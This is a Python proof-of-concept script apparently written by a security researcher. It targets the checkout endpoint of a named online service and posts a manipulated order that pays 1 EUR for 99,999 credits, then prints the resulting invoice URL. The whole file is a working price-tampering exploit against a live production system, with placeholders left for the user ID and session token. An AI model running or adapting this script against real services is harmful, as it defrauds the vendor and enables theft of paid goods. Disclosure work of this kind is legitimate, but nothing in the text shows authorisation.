import requests
import json

# ============================
# Configuration
# ============================

endpoint = "https://app.pykaso.ai/pricing/checkout/basic-50"

# Replace with your actual user details or test account info
user_payload = [
    {
        "amount": 1,  # Amount to be paid (e.g. 1 EUR)
        "productAmount": 99999,  # Desired credit amount
        "userId": "user-id-here",
        "promoCodeId": "$undefined",
        "email": "example@yin.sh",
        "country": "DE"
    }
]

headers = {
    "Content-Type": "application/json",
    "User-Agent": "PoC-Security-Researcher/1.0",
    # Add any required authentication headers (e.g. session token)
}

# ============================
# Step 1: Send the modified POST request
# ============================

print("[*] Sending manipulated checkout payload...")

response = requests.post(endpoint, headers=headers, data=json.dumps(user_payload))

if response.status_code != 200:
    print(f"[!] Request failed with status code: {response.status_code}")
    print(response.text)
    exit()

try:
    result = response.json()
except json.JSONDecodeError:
    print("[!] Failed to parse JSON response")
    print(response.text)
    exit()

# ============================
# Step 2: Extract and display invoice URL
# ============================

try:
    invoice_url = result[1]
    print(f"[+] Invoice URL generated: {invoice_url}")
    print("[!] WARNING: This invoice charges only 1 EUR for 99,999 credits.")
except (IndexError, KeyError):
    print("[!] Unexpected response format:")
    print(result)
